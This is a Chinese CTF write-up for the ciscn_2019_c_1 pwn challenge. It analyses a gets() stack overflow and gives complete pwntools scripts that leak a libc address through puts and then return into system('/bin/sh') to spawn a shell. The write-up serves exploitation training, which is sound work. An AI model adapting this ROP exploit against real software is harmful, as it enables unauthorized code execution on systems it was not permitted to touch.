# ciscn_2019_c_1

## 查看保护

开启了NX保护，64位程序

```bash
$ checksec --file=ciscn_2019_c_1
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



## main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  ...
  while ( 1 )
  {
    while ( 1 )
    {
      fflush(0LL);
      v4 = 0;
      __isoc99_scanf("%d", &v4);
      getchar();
      if ( v4 != 2 )
        break;
      puts("I think you can do it by yourself");
      begin();
    }
    if ( v4 == 3 )
    {
      puts("Bye!");
      return 0;
    }
    if ( v4 != 1 )
      break;
    encrypt();
    begin();
  }
  puts("Something Wrong!");
  return 0;
}
```

逻辑为输入1，进入encrypt()；输入2无用；输入3退出



## encrypt函数

```c
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 >= strlen(s) )
      break;
    if ( s[x] <= 96 || s[x] > 122 )
    {
      if ( s[x] <= 64 || s[x] > 90 )
      {
        if ( s[x] > 47 && s[x] <= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts("Ciphertext");
  return puts(s);
}
```

逻辑为如果s为数字，与0xF异或；如果为大写字母，与0xE异或；如果为小写字母，与0xD异或



## 栈溢出

gets(s)存在栈溢出，栈的大小为0x50，要覆盖到返回地址还需要加上saved rbp，一共是（0x50+8）=88



## 泄露libc基址

puts函数可以用来泄露Libc基址

![](https://pic.imgdb.cn/item/6247b6b327f86abb2a039bda.jpg)

```python
from pwn import*
from LibcSearcher import*

#r=remote('node3.buuoj.cn',28214)
r=process('./ciscn_2019_c_1')
elf=ELF('./ciscn_2019_c_1')

pop_rdi=0x400c83

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_plt=elf.symbols['_start']

payload=88*b'a'+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_plt)
r.sendlineafter('choice!\n','1')
r.sendlineafter('encrypted\n',payload)
r.recvline()
r.recvline()

puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))
print("puts_addr=",hex(puts_addr))
```



## /bin/sh和sytem()地址

得到Libc基质就可以根据偏移计算出system()和/bin/sh地址

```python
libc=LibcSearcher('puts',puts_addr)
offset=puts_addr-libc.dump('puts')
binsh=offset+libc.dump('str_bin_sh')
system=offset+libc.dump('system')
```



## EXP

思路：

- 首先将puts_got弹入rdi作为参数传递给puts_plt，泄露puts函数地址
- 利用libcsearcher模块来找到libc基址，计算出system和/bin/sh地址
- 将返回地址设为main函数地址，使程序再次执行
- 将/bin/sh放入rdi中作为system函数参数，将返回地址覆盖为要执行的system函数地址
- 为了平衡堆栈（题目环境为Ubuntu18），需要添加ret地址



```python
from pwn import*
from LibcSearcher import*

#r=remote('node3.buuoj.cn',28214)
r=process('./ciscn_2019_c_1')
elf=ELF('./ciscn_2019_c_1')

main=0x400b28
pop_rdi=0x400c83
ret=0x4006b9

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

r.sendlineafter('choice!\n','1')
payload=b'\0'+b'a'*(0x50-1+8)
payload+=p64(pop_rdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(main)

r.sendlineafter('encrypted\n',payload)
r.recvline()
r.recvline()

puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))


libc=LibcSearcher('puts',puts_addr)
offset=puts_addr-libc.dump('puts')
binsh=offset+libc.dump('str_bin_sh')
system=offset+libc.dump('system')

r.sendlineafter('choice!\n','1')

payload=b'\0'+b'a'*(0x50-1+8)
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)

r.sendlineafter('encrypted\n',payload)

r.interactive()

```



不知道为什么我在本地环境Kali和UOS下一直Get EOF出错，但是试试靶场没问题，拿到了flag
